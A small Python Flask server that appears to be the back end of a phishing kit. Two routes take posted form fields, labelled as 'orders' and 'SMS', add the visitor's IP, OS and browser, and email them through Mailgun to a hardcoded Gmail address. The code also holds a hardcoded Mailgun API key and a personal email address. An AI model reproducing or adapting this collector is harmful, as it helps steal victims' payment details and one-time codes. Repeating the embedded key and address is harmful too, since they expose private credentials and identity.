from flask import Flask,request
from user_agents import parse
from requests import post
app = Flask(__name__)
EMAIL_DOMAIN = "sandbox586232a922274a4da89148d3cf22c8d5.mailgun.org"
EMAIL_API_KEY = "a72b9f4278a87fb96656a29ba53fba9f-e566273b-192f5999"
GATE_LINK = "https://api.mailgun.net/v3/{}/messages".format(EMAIL_DOMAIN)
From = "admin@"+EMAIL_DOMAIN
subject_res = "new order from "
subject_sms = "new SMS from "
to = "amine.yamani92@gmail.com"
def sift(mnine, data, subj ,send_to):
    response = post(GATE_LINK, auth=('api', EMAIL_API_KEY), data={
            'html': data,
            'to': send_to,
            'subject': "{}".format(subj),
            'from': "{}".format(mnine)
        })
    return response.text
def get_info(request):
    ip = request.access_route[0]
    user_agent = request.headers.get('User-Agent')
    user_agent = parse(user_agent)
    visite = {}
    visite['browser'] = {"family": user_agent.browser.family,
                         "version": user_agent.browser.version_string}
    visite['device'] = {"family": user_agent.device.family,
                        "brand": user_agent.device.brand,
                        "model": user_agent.device.model}
    visite['os'] = {"family": user_agent.os.family,
                    "version": user_agent.os.version_string}
    visite['ip'] = ip
    if user_agent.is_pc:
        visite['platform'] = "Pc"
    elif user_agent.is_mobile:
        visite['platform'] = "Mobile"
    elif user_agent.is_tablet:
        visite['platform'] = "Tablet"
    elif user_agent.is_bot:
        visite['platform'] = "Bot"
    else:
        visite['platform'] = "Other"
    return visite

@app.route('/', methods=['GET','POST'])
def hello():
    if request.method == 'POST':
        device_inofs = get_info(request)
        browser = str(device_inofs['browser']['family'])
        os = str(device_inofs['os']['family'])
        html = request.form['logo']+"<br>"+os+"<br>"+browser
        ip = device_inofs['ip']
        subject = subject_res+ip
        sift(From, html, subject ,to)
        return "ok"

@app.route('/sms', methods=['GET','POST'])
def sms():
    if request.method == 'POST':
        device_inofs = get_info(request)
        browser = str(device_inofs['browser']['family'])
        os = str(device_inofs['os']['family'])
        ip = device_inofs['ip']
        html = request.form['smimo']+"<br>"+os+"<br>"+browser
        subject =  subject_sms+ip
        sift(From, html, subject ,to)
        return "ok"

if __name__ == '__main__':
    app.run(debug=True)
